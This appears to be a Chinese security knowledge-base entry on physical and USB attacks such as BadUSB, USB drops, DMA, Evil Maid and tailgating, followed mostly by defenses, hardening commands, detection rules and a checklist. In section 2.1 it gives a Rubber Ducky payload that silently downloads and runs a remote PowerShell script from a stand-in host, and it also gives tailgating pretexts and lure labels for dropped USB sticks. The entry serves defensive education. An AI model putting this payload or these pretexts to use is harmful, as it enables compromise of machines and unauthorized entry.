# 物理与近场攻击 (Physical & USB Attacks)

> 分类：物理安全 / 终端 | 风险：高 | MITRE T1200 / T1091 / T1052 | 攻击链：初始访问 / 提权

## 1. 攻击原理

当攻击者能**接触设备、网络端口或人**时，很多数字防护会被绕过：

| 手法 | 说明 |
|---|---|
| BadUSB / HID 注入 | 伪装成键盘，自动输入命令（Rubber Ducky、O.MG Cable） |
| 恶意 U 盘投放 | 在停车场/前台丢「诱饵 U 盘」，等人插入 |
| USB Killer | 高压击穿设备 |
| DMA 攻击 | 通过 Thunderbolt/PCIe 直接读写内存（Thunderbolt 漏洞） |
| Evil Maid | 物理接触后篡改引导/固件，植入后门 |
| 尾随（Tailgating） | 跟着员工进入受控区域 |
| 肩窥（Shoulder Surfing） | 偷看屏幕/键盘/便签 |
| 翻垃圾（Dumpster Diving） | 从废弃资料获取信息 |
| 硬件植入 | 键盘记录器、网卡、KVM、SIM 卡克隆 |
| 锁具与门禁破解 | 撬锁、复制门禁卡、尾随 |
| 设备盗窃 | 未加密笔记本直接读取数据 |

关键前提：设备未加密、未锁屏、USB 未管控、门禁形同虚设。

## 2. 攻击示例

### 2.1 Rubber Ducky 载荷

```text
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "iwr http://evil/x.ps1 | iex"
ENTER
```

插入后数秒完成下载执行，用户可能完全没注意。

### 2.2 O.MG Cable

外观与普通数据线一致，内置 Wi-Fi，可远程触发按键注入、窃取输入。

### 2.3 恶意 U 盘投放

```text
在目标公司停车场撒 10 个 U 盘，标签写「薪资调整名单」「2026 年终奖」
→ 好奇者插入 → 自动执行（Autorun 或伪装 LNK）
```

### 2.4 尾随进入

```text
穿工服、抱纸箱，跟在员工身后
→ 「忘带卡了，能帮我开下门吗？」
→ 进入办公区，接入空闲网口 / 偷走笔记本
```

### 2.5 Evil Maid

```text
1. 趁设备无人，用启动盘进入系统
2. 修改引导加载器 / 安装内核模块 / 植入固件
3. 恢复原状，用户下次开机即中招
```

### 2.6 DMA（Thunderbolt）

```text
插入恶意 Thunderbolt 设备
→ 通过 DMA 读取内存中的密钥、解锁状态
→ 绕过锁屏
```

## 3. 影响

- 直接获得终端控制权，绕过所有网络防护
- 全盘数据被复制（未加密时）
- 植入持久化后门，长期潜伏
- 门禁/工牌被复制，物理入侵常态化
- 供应链环节被植入硬件后门

## 4. 防御措施

1. **全盘加密**：FileVault（macOS）、BitLocker（Windows）、LUKS（Linux），密钥与恢复码离线保管。
2. **锁屏策略**：自动锁屏 ≤ 5 分钟，离开即锁（`Ctrl+Cmd+Q` / `Win+L`）。
3. **USB 管控**：
   - 默认禁用大容量存储，仅允许白名单设备
   - 使用带数据阻断的充电线/端口封堵器
   - 端点 DLP 监控 USB 拷贝
4. **DMA 防护**：BIOS 开启 IOMMU/VT-d、Thunderbolt 安全级别设为「用户授权」，禁用未使用端口。
5. **安全启动**：Secure Boot、固件密码、Boot Order 锁定，防 Evil Maid。
6. **门禁与访客管理**：
   - 防尾随门（mantrap）、刷卡 + 生物识别
   - 访客登记、陪同、临时工牌限时失效
   - 工牌不可复制（防克隆卡），丢失即时挂失
7. **物理环境**：
   - 机柜上锁、空闲网口禁用、配线间受控
   - 屏幕防窥膜、清理桌面（Clean Desk）
   - 碎纸机（交叉切割），敏感文件不落地
8. **设备管理**：
   - 资产盘点、MDM 注册、丢失远程擦除
   - 禁止私人设备接入内网（NAC/802.1X）
9. **供应链验收**：新设备验封、固件校验、来源可信。
10. **意识培训**：不插不明 U 盘、不帮陌生人开门、不在公共场合讨论敏感信息。

## 5. 配置与检测对比

```bash
# ✅ macOS：启用 FileVault 与固件密码
sudo fdesetup status
sudo fdesetup enable
# 固件密码需在恢复模式设置；MDM 可强制 FileVault

# ✅ 锁屏策略（MDM 或 sudo）
sudo defaults write /Library/Preferences/com.apple.screensaver idleTime -int 300
```

```powershell
# ✅ Windows：BitLocker + USB 存储管控（GPO）
Enable-BitLocker -MountPoint C: -EncryptionMethod XtsAes256 -UsedSpaceOnly
# GPO: Computer Configuration > Administrative Templates > System > Removable Storage Access
#       All Removable Storage classes: Deny all access
```

```bash
# ✅ Linux：USBGuard 白名单
usbguard generate-policy > rules.conf
usbguard install-policy rules.conf
```

```yaml
# ✅ 检测：异常 USB 插入（EDR/SIEM 思路）
- alert: UsbMassStorageInserted
  expr: increase(usb_device_inserted_total{device_class="mass_storage"}[5m]) > 0
- alert: HidInjectionBurst
  expr: rate(keystroke_events_total[10s]) > 50   # 机器速度远超人类
```

```yaml
# ✅ 门禁异常
- alert: BadgeTailgatingSuspected
  expr: increase(door_open_without_badge_total[5m]) > 0
- alert: AfterHoursAccess
  expr: increase(door_access_total{hour=~"0|1|2|3|4|5"}[1h]) > 0
```

## 6. 自查清单

- [ ] 所有笔记本/移动设备全盘加密，恢复密钥离线保管
- [ ] 自动锁屏 ≤ 5 分钟，员工离开即锁
- [ ] USB 大容量存储默认禁用，白名单设备可用
- [ ] BIOS 开启 IOMMU、Secure Boot、固件密码
- [ ] Thunderbolt 安全级别已设置，空闲端口封堵
- [ ] 门禁防尾随，访客登记与陪同
- [ ] 工牌防克隆，丢失即时挂失
- [ ] 机柜/配线间上锁，空闲网口禁用
- [ ] 防窥膜、Clean Desk、碎纸机已落实
- [ ] 资产盘点与 MDM 远程擦除可用
- [ ] 新设备验封与固件校验流程
- [ ] 员工培训覆盖 U 盘与尾随风险

## 7. 参考资料

- MITRE ATT&CK T1200: Hardware Additions
- MITRE ATT&CK T1091: Replication Through Removable Media
- MITRE ATT&CK T1052: Exfiltration over Physical Medium
- NIST SP 800-53 PE（物理与环境防护）
- NSA: Physical Security Best Practices
- 关联本库：`48-malware`、`51-insider-threat`、`30-sensitive-data-exposure`
